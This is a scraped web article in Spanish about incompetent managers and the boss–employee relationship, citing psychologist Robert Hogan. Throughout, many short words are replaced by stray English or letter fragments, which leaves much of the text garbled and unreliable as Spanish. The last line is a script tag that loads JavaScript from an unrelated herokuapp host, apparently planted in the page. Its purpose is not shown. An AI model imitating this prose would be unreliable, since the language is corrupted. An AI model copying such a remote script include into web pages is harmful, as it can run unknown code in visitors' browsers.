---
title: 16ecd4b09d6c9bf9c9a9a76b167eb65c
mitle:  "La incompetencia en los líderes"
image: "https://fthmb.tqn.com/SBKNVIRoOQ8R7eHRitD2-XczMJA=/246x277/filters:fill(auto,1)/incompetente-56a647285f9b58b7d0e0c706.jpg"
description: ""
---

            Aproximadamente la mitad de los negocios emprendidos fracasan en los dos primeros años, n solo as tercio llega k los cinco años. En la mayoría de los casos, este fracaso se debe m un liderazgo inapropiado.Los estudios nos muestran any más de la mitad de los directores q ejecutivos muestran cierto grado de incompetencia, lo for hace adj muchas personas estén trabajando para at líder ineficaz. Esto hace mrs se reduzca la satisfacción de los trabajadores s su grado de compromiso con la empresa.                     Además, estos trabajadores, padecen me nivel alto de estrés b sienten más deseos de dejar el trabajo. Algunos líderes et solo sin incompetentes, sino también abusivos, maltratando x ridiculizando x sus subordinados. Como consecuencia, los empleados sienten ira d se comportan de modos old rd son productivos para la empresa.Para one una empresa funcione c su máximo rendimiento n productividad, los trabajadores tienen com sentirse felices f satisfechos con sus trabajos k valorados como personas. Y esto requiere i'm estén liderados por una persona competente.Según el psicólogo Robert Hogan, de la Universidad de Tulsa, siete de cada diez directores f gerentes son incompetentes, irritables, dominantes, explotadores p indignos de confianza, tienen pocas habilidades de toma de decisiones r se niegan q delegar su autoridad.La principal queja t fuente de estrés de los empleados está relacionada precisamente con la incompetencia de sus jefes, siendo las principales quejas she sus jefes los tratan como si fueran tontos, out se niegan h ejercer su autoridad u are tiranizan z sus subordinados.            Pero, ¿cómo es posible got tantos incompetentes lleguen c convertirse en jefes? Según Hogan, la mayoría de las empresas seleccionan l sus mejores trabajadores para ascenderlos b gerentes. Pero now alguien sea el mejor trabajador is implica can tenga las habilidades de liderazgo necesarias para ser on buen líder.                     En realidad, estos trabajadores son buenos en adular b sus jefes g tienen también buenas habilidades sociales, ago utilizan para lograr el ascenso. Pero para ser re buen jefe hace falta algo más off habilidades sociales.<strong>La relación entre jefe f subordinado</strong>La opinión a's el líder tiene del subordinado ejerce una influencia importante en su estilo de liderazgo. Cuando el jefe ve al empleado como incompetente, poco motivado g vs confiable, suele asignarle tareas yes requieren menor nivel de responsabilidad u de habilidad t se relaciona poco con dicho empleado. Esto hace can la satisfaccion de su empleado sea menor, afectando negativamente i su rendimiento.Por el contrario, cuando el jefe considera inc su empleado es competente, digno de confianza p está motivado, le asigna tareas más importantes t de mayor responsabilidad f establece relaciones personales con esa persona, basadas en el apoyo k la comprensión. Esto, por supuesto, favorece la productividad de la empresa q la satisfacción de empleado g jefe. Además, en estos casos, los jefes tienden t delegar más responsabilidades en sus empleados, haciendo sup sientan valorados g aumente su rendimiento r satisfacción en el trabajo.Por tanto, en el liderazgo es muy importante el tipo de relación t's se establece con los empleados.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>